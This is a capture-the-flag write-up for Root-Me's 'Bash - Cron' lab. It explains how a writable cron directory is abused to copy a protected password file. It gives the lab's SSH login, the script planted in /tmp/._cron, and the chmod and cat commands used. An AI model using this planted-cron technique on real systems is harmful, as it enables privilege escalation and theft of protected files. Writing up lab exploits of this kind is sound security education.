### Challenge Documentation: Bash - Cron

**Category:** Root-Me / App-Script  

**Link:** [Bash - Cron](https://www.root-me.org/en/Challenges/App-Script/Bash-cron)

#### **Objective**
The goal is to exploit a cron job configuration to access the hidden password file located at `.passwd`.

### **1. Initial Setup**

The challenge provides SSH credentials to access the server:
- **Host**: `challenge02.root-me.org`  
- **Port**: `2222`  
- **Username**: `app-script-ch4`  
- **Password**: `app-script-ch4`  

#### **Connection Command**:
```bash
ssh -p 2222 app-script-ch4@challenge02.root-me.org
```

### **2. File Analysis**

Upon logging in, examine the directory contents:
```bash
ls -al
```

**Output:**
```
total 24
dr-xr-x---  2 app-script-ch4-cracked app-script-ch4         4096 Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4096 Sep  5  2023 ..
-r-xr-x---  1 app-script-ch4-cracked app-script-ch4          767 Dec 10  2021 ch4
lrwxrwxrwx  1 root                   root                     11 Dec 10  2021 cron.d -> /tmp/._cron
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-r--r-----  1 app-script-ch4-cracked app-script-ch4-cracked   16 Dec 10  2021 .passwd
-r--------  1 root                   root                    629 Dec 10  2021 ._perms
```

### **3. Key Observations**

1. **`cron.d` is a symlink** pointing to `/tmp/._cron`.  
   - This allows us to place scripts in `/tmp/._cron` that will be executed by the cron job system.  
   - The directory `/tmp` is generally writable by all users.  
2. The hidden `.passwd` file contains the challenge password, but it is not directly readable due to permissions.
3. The executable `ch4` appears to have no direct relevance to this challenge.

### **4. Exploitation Steps**

#### **Step 1: Navigate to the Cron Directory**

Change to the writable `/tmp/._cron` directory:
```bash
cd /tmp/._cron
```

#### **Step 2: Create a Malicious Cron Task**

Create a script that reads the `.passwd` file and stores its content in a world-readable file, such as `/tmp/mdp`:
```bash
echo '#!/bin/sh
cat /home/app-script-ch4/.passwd > /tmp/mdp' > task1
```

**Note:** The `\n` (newline) is required after `#!/bin/sh` to ensure the script is correctly interpreted.

#### **Step 3: Set Permissions for the Script**

Grant executable permissions to the script to ensure it can be run by the cron system:
```bash
chmod 4777 task1
```

#### **Step 4: Wait for the Cron Job to Execute**

Cron jobs are executed every minute. After placing the script in `/tmp/._cron`, wait one minute to allow it to run. The task will copy the content of `.passwd` to `/tmp/mdp`.

#### **Step 5: Retrieve the Password**

Once the cron job executes, view the content of `/tmp/mdp` to reveal the password:
```bash
cat /tmp/mdp
```

### **5. Output**

The output displays the hidden password. Example:
```
***************************
```

### **6. Summary of Commands**

Here is the complete set of commands used to solve the challenge:
```bash
ssh -p 2222 app-script-ch4@challenge02.root-me.org

# Navigate to the writable cron directory
cd /tmp/._cron

# Create a malicious cron task
echo '#!/bin/sh
cat /home/app-script-ch4/.passwd > /tmp/mdp' > task1

# Set the script's permissions
chmod 4777 task1

# Wait one minute for the cron job to execute

# Retrieve the password
cat /tmp/mdp
```

### **7. Conclusion**

By exploiting the writable `/tmp/._cron` directory, we were able to inject a malicious task that copied the content of the `.passwd` file to a readable location. This demonstrates the risk of insecure configurations in cron job management.  
